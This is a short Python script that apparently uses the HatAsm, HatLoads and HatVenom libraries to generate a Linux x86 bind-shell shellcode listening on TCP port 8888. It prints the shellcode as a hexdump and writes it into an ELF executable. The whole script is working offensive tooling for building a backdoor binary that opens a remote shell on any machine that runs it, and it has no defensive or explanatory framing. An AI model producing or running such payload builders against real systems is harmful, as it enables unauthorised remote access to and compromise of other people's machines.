#!/usr/bin/env python3

from hatasm import HatAsm
from hatloads import HatLoads
from hatvenom import HatVenom

hatasm = HatAsm()
hatloads = HatLoads()
hatvenom = HatVenom()

options = {
    'BPORT': 8888
}

print("[*] Assembling shellcode...")
shellcode = hatloads.get_payload('linux', 'x86', 'shell_bind_tcp', options)

print("[i] Generated shellcode:")
for line in hatasm.hexdump(shellcode):
    print(line)

print("[*] Writing shellcode to ELF...")
hatvenom.generate_to('elf', 'x86', shellcode)
